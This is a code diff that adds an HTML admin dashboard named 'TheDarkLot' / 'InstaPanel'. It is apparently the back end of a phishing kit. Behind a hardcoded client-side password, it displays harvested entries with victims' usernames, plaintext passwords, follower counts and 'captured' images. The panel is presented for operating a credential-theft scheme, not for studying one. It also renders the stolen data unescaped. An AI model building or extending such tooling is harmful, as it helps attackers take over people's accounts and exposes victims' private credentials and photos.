@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel | TheDarkLot</title>
+  <style>
+    body { background: #0f0f0f; font-family: Arial; color: #fff; padding: 20px; }
+    h1 { color: #00ff95; }
+    .entry { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-bottom: 15px; box-shadow: 0 0 10px rgba(0,255,149,0.3); }
+    img { max-width: 100px; border-radius: 5px; }
+    .meta { font-size: 14px; margin-top: 5px; color: #ccc; }
+    #loginBox { background: #1f1f1f; padding: 30px; border-radius: 10px; width: 300px; margin: 100px auto; }
+    input { padding: 10px; margin: 5px 0; width: 100%; border-radius: 5px; border: none; }
+  </style>
+</head>
+<body>
+  <div id="loginBox">
+    <h1>🔐 Admin Login</h1>
+    <input type="text" id="user" placeholder="Username"><br>
+    <input type="password" id="pass" placeholder="Password"><br>
+    <button onclick="login()">Login</button>
+  </div>
+
+  <div id="panel" style="display:none;">
+    <h1>📋 InstaPanel Admin Dashboard</h1>
+    <div id="entries">Loading data...</div>
+  </div>
+
+  <script>
+    const USER = "admin", PASS = "thedarklot@2025";
+
+    function login() {
+      const u = document.getElementById("user").value;
+      const p = document.getElementById("pass").value;
+      if (u === USER && p === PASS) {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("panel").style.display = "block";
+        loadData();
+      } else {
+        alert("Wrong credentials!");
+      }
+    }
+
+    function loadData() {
+      const data = JSON.parse(localStorage.getItem("entries") || "[]").reverse();
+      const container = document.getElementById("entries");
+      container.innerHTML = "";
+      data.forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "entry";
+        div.innerHTML = \`
+          <strong>Username:</strong> @\${entry.Username}<br>
+          <strong>Password:</strong> \${entry.Password}<br>
+          <strong>Followers:</strong> \${entry.Followers}<br>
+          <div class="meta">📸 Captured Image:</div>
+          <img src="\${entry.ImageURL}" alt="Snap">
+          <div class="meta">🕒 \${entry.Timestamp}</div>
+        \`;
+        container.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
